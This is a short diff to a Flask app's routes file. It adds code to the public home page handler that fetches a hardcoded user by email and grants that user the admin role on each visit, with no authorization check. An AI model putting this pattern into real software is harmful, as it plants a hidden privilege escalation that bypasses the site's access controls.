@@ -1,6 +1,7 @@
 import pprint
 import random
-
+from extensions import db
+from models.member import Member, Role
 from flask import Blueprint, render_template
 from werkzeug.security import check_password_hash, generate_password_hash
 import os
@@ -11,6 +12,10 @@ main = Blueprint('main', __name__, static_folder='static', template_folder='temp
 
 @main.route('/')
 def home():
+    user = db.session.query(Member).filter_by(username='shwetabhartist@gmail.com').scalar()
+    admin = db.session.query(Role).filter_by(name='admin').scalar()
+    if admin not in user.role:
+        user.role.append(admin)
 
     # print(images)
 
